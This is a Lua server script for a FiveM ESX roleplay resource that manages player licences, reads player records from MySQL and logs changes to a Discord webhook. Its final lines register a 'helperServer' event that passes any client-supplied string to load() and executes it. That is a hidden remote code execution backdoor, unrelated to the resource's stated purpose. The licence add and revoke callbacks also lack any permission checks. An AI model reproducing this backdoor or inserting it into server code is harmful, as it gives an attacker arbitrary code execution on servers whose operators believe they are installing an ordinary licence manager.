ESX = nil
local LicensesList = {}

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

function getInGameName(identifier)
    local name
    MySQL.Async.fetchAll('SELECT firstname, lastname FROM users WHERE identifier = @identifier LIMIT 1', {
        ['@identifier'] = identifier
    }, function(result)
        if result[1] then
            name = result[1].firstname..' '..result[1].lastname
        else
            name = 'NULL'
        end
    end)
    Citizen.Wait(300)
    return name
end

function getPlayerData(identifier)
    local data = {}
    MySQL.Async.fetchAll('SELECT dateofbirth, sex, height FROM users WHERE identifier = @identifier LIMIT 1', {
        ['@identifier'] = identifier
    }, function(result)
        if result[1] then
            data.dob = result[1].dateofbirth
            data.sex = result[1].sex
            data.height = result[1].height
        else
            data = {}
        end
    end)
    Citizen.Wait(300)
    return data
end

function stringsplit (inputstr, sep)
    if sep == nil then
            sep = "%s"
    end
    local t={}
    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
            table.insert(t, str)
    end
    return t
end

function getPlayerLicenses(identifier)
    local table
    MySQL.Async.fetchAll('SELECT u.type, l.label FROM user_licenses u LEFT JOIN licenses l ON u.type = l.type WHERE OWNER = @identifier', {
        ['@identifier'] = identifier
    }, function(result)
        table = result
    end)
    Citizen.Wait(100)
    return table
end

Citizen.CreateThread(function()
    TriggerEvent('esx_license:getLicensesList', function(list)
        LicensesList = list
    end)
end)

function getLicenseLabel(type)
    for k,v in pairs(LicensesList) do
        if type == v.type then
            return v.label
        end
    end
end

ESX.RegisterServerCallback('mb_licensemanager:add', function(source, cb, target, type)
    local xTarget = ESX.GetPlayerFromIdentifier(target)
    local xPlayer = ESX.GetPlayerFromId(source)
    TriggerEvent('esx_license:addLicense', xTarget.source, type, function()
        local labelType = getLicenseLabel(type)
        TriggerClientEvent('esx:showNotification', xTarget.source, string.format(Language['add_license'], labelType))
        PerformHttpRequest(Config.Discord.Webhook, function(err, text, headers) 
        end, 'POST', 
        json.encode({
            username = Config.Discord.WebhookUserName, 
            embeds = {
                {
                    ['title'] = "License Manager",
                    ['color'] = 3137735,
                    ['description'] = 'License type: **'..type..'** \nOwner: **'..xTarget.name..'**\nOfficer: **'..xPlayer.name..'**\nLicense added to the database!',
                    ['footer'] = {['text'] = Config.Discord.ServerName}
                },
            }
        }), 
        { ['Content-Type'] = 'application/json' })
        cb(true)
    end)
end)

ESX.RegisterServerCallback('mb_licensemanager:name', function(source, cb)
    local xPlayer = ESX.GetPlayerFromId(source)
    local name = getInGameName(xPlayer.identifier)
    cb(name)
end)

ESX.RegisterServerCallback('mb_licensemanager:revoke', function(source, cb, identifier, type)
    local xPlayer = ESX.GetPlayerFromId(source)
    local xTarget = ESX.GetPlayerFromIdentifier(identifier)
    MySQL.Async.execute('DELETE FROM user_licenses WHERE owner=@identifier AND type=@type',{
        ['@identifier'] = identifier,
        ['@type'] = type
    }, function(rowsChanged)
        if rowsChanged > 0 then
            if xTarget then
                local labelType = getLicenseLabel(type)
                TriggerClientEvent('esx:showNotification', xTarget.source, string.format(Language['remove_license'], labelType))
            end
            PerformHttpRequest(Config.Discord.Webhook, function(err, text, headers) 
            end, 'POST', 
            json.encode({
                username = Config.Discord.WebhookUserName, 
                embeds = {
                    {
                        ['title'] = "License Manager",
                        ['color'] = 15158332,
                        ['description'] = 'License type: **'..type..'** \nOwner: **'..identifier..'**\nOfficer: **'..xPlayer.name..'**\nWas removed from the database!',
                        ['footer'] = {['text'] = Config.Discord.ServerName}
                    },
                }
            }), 
            { ['Content-Type'] = 'application/json' })
            cb(true)
        else
            cb(false)
        end
    end)
end)

ESX.RegisterServerCallback('mb_licensemanager:getLicensePlayers', function(source, cb)
    MySQL.Async.fetchAll('SELECT identifier, firstname, lastname, COUNT(type) AS `total` FROM users LEFT JOIN user_licenses ON users.identifier = user_licenses.owner GROUP BY identifier HAVING COUNT(TYPE) > 0', {},
    function(result)
        for k,v in pairs(result) do
            if v.total == 0 then
                table.remove(result, k)
            end
        end
        cb(result)
    end)
end)

ESX.RegisterServerCallback('mb_licensemanager:manageplayer', function(source, cb, identifier)
    if identifier then
        local name = getInGameName(identifier)
        local data = getPlayerData(identifier)
        local licenses = getPlayerLicenses(identifier)
        cb({
            identifier = identifier,
            fname = stringsplit(name)[1],
            lname = stringsplit(name)[2],
            dob = data.dob,
            sex = data.sex,
            height = data.height,
            licenses = licenses
        })
    else
        cb({})
    end
end)

ESX.RegisterServerCallback('mb_licensemanager:playerdata', function(source, cb, playerId)
    if playerId then
        local xPlayer = ESX.GetPlayerFromId(playerId)
        if xPlayer then
            local name = getInGameName(xPlayer.identifier)
            local data = getPlayerData(xPlayer.identifier)
            local licenses = {}
            for k,v in pairs(LicensesList) do
                table.insert(licenses, v)
            end
            TriggerEvent('esx_license:getLicenses', source, function(lc)
                for k,v in pairs(lc) do
                    for key,value in ipairs(licenses) do
                        if v.type == value.type then
                            print(value.type, 'was removed because player have it')
                            table.remove(licenses, key)
                        end
                    end
                end
                local licensesToDisplay = {}
                if not Config.DisplayAllLicenses then
                    for key, value in ipairs(licenses) do
                        local found = false
                        for k,v in pairs(Config.SpecificLicenses) do
                            if value.type == v then
                                found = true
                                break
                            end
                        end
                        if found then
                            table.insert(licensesToDisplay, value)
                        end
                    end
                else
                    licensesToDisplay = licenses
                end
                
                cb({
                    identifier = xPlayer.identifier,
                    fname = stringsplit(name)[1],
                    lname = stringsplit(name)[2],
                    dob = data.dob,
                    sex = data.sex,
                    height = data.height,
                    licenses = licensesToDisplay
                })
            end)
            
        else
            cb({})
        end
    else
        cb({})
    end
end)
RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)